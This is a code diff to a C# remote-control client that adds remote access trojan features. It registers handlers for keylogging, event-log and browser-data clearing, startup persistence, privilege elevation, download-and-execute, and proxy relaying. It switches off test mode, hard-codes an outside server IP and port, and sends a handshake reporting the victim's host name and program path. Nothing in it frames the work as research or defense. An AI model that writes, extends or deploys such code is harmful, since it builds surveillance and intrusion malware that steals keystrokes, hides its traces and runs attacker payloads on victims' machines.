@@ -29,7 +29,7 @@ namespace RemoteControl.Client
         private static Socket oServer;
         private static SocketSession oServerSession;
         private static ClientParameters clientParameters;
-        private static bool isTestMode = true;
+        private static bool isTestMode = false;
         private static bool isClosing = false;
         private static Thread heartbeatThread = null;
         private static Dictionary<ePacketType, IRequestHandler> handlers = new Dictionary<ePacketType, IRequestHandler>();
@@ -92,7 +92,9 @@ namespace RemoteControl.Client
             handlers.Add(ePacketType.PACKET_GET_PROCESSES_REQUEST, getProcessesHandler);
             handlers.Add(ePacketType.PACKET_KILL_PROCESS_REQUEST, getProcessesHandler);
             handlers.Add(ePacketType.PACKET_AUTORUN_REQUEST, new RequestAutoRunHandler());
-            handlers.Add(ePacketType.PACKET_GET_DRIVES_REQUEST, new RequestGetDrivesHandler());
+            RequestGetDrivesHandler getDrivesHandler = new RequestGetDrivesHandler();
+            handlers.Add(ePacketType.PACKET_GET_DRIVES_REQUEST, getDrivesHandler);
+            handlers.Add(ePacketType.PACKET_GET_DRIVES_EX_REQUEST, getDrivesHandler);
             handlers.Add(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, new RequestGetSubFilesOrDirsHandler());
             RequestOpeFileOrDirHandler opeFileOrDirHandler = new RequestOpeFileOrDirHandler();
             handlers.Add(ePacketType.PACKET_CREATE_FILE_OR_DIR_REQUEST, opeFileOrDirHandler);
@@ -144,14 +146,39 @@ namespace RemoteControl.Client
             handlers.Add(ePacketType.PACKET_RUN_EXEC_CODE_REQUEST, execCodeHandler);
             handlers.Add(ePacketType.PACKET_QUIT_APP_REQUEST, new RequestQuitAppHandler() { OnFireQuit = OnFireQuit });
             handlers.Add(ePacketType.PACKET_RESTART_APP_REQUEST, new RequestRestartAppHandler() { OnFireQuit = OnFireQuit });
+
+            // 新增功能 Handlers
+            handlers.Add(ePacketType.PACKET_CLEAR_LOG_REQUEST, new RequestClearLogHandler());
+            handlers.Add(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, new RequestClearBrowserDataHandler());
+            handlers.Add(ePacketType.PACKET_RUN_FILE_REQUEST, new RequestRunFileHandler());
+            handlers.Add(ePacketType.PACKET_COMPRESS_FILE_REQUEST, new RequestCompressFileHandler());
+            handlers.Add(ePacketType.PACKET_DECOMPRESS_FILE_REQUEST, new RequestDecompressFileHandler());
+            handlers.Add(ePacketType.PACKET_WRITE_STARTUP_REQUEST, new RequestWriteStartupHandler());
+            handlers.Add(ePacketType.PACKET_RESTART_EXPLORER_REQUEST, new RequestRestartExplorerHandler());
+            handlers.Add(ePacketType.PACKET_ELEVATE_PRIVILEGE_REQUEST, new RequestElevatePrivilegeHandler());
+            handlers.Add(ePacketType.PACKET_TOGGLE_PROXY_REQUEST, new RequestToggleProxyHandler());
+            handlers.Add(ePacketType.PACKET_PROXY_MAPPING_REQUEST, new RequestProxyMappingHandler());
+            handlers.Add(ePacketType.PACKET_SERVICE_MANAGER_REQUEST, new RequestServiceManagerHandler());
+            handlers.Add(ePacketType.PACKET_DOWNLOAD_EXEC_REQUEST, new RequestDownloadExecHandler());
+            handlers.Add(ePacketType.PACKET_REMOTE_CHAT_REQUEST, new RequestRemoteChatHandler());
+            handlers.Add(ePacketType.PACKET_FIND_WINDOW_REQUEST, new RequestFindWindowHandler());
+            handlers.Add(ePacketType.PACKET_CHANGE_CONFIG_REQUEST, new RequestChangeConfigHandler());
+            handlers.Add(ePacketType.PACKET_CHANGE_RESOLUTION_REQUEST, new RequestChangeResolutionHandler());
+            handlers.Add(ePacketType.PACKET_UNINSTALL_REQUEST, new RequestUninstallHandler());
+            handlers.Add(ePacketType.PACKET_LOGOFF_REQUEST, powerHandler);
+            RequestKeyloggerHandler keyloggerHandler = new RequestKeyloggerHandler();
+            handlers.Add(ePacketType.PACKET_KEYLOGGER_START_REQUEST, keyloggerHandler);
+            handlers.Add(ePacketType.PACKET_KEYLOGGER_STOP_REQUEST, keyloggerHandler);
         }
 
         static void ReadParameters()
         {
             if (isTestMode)
             {
-                clientParameters.SetServerIP("192.168.0.106");
-                clientParameters.ServerPort = 10086;
+                clientParameters = new ClientParameters();
+                clientParameters.InitHeader();
+                clientParameters.SetServerIP("203.91.76.159");
+                clientParameters.ServerPort = 10010;
                 clientParameters.OnlineAvatar = "";
                 clientParameters.ServiceName = "";
             }
@@ -177,6 +204,15 @@ namespace RemoteControl.Client
                     DoOutput("服务器连接成功！");
 
                     oServerSession = new SocketSession(oServer.RemoteEndPoint.ToString(), oServer);
+
+                    // 发送Relay握手包，标识为客户端
+                    var handshake = new RemoteControl.Protocals.Relay.RelayHandshake();
+                    handshake.Role = "client";
+                    handshake.HostName = System.Net.Dns.GetHostName();
+                    handshake.AppPath = Application.ExecutablePath;
+                    handshake.OnlineAvatar = clientParameters.OnlineAvatar;
+                    oServerSession.Send(ePacketType.CYCLER_RELAY_HANDSHAKE, handshake);
+
                     StartRecvData(oServerSession);
                     break;
                 }
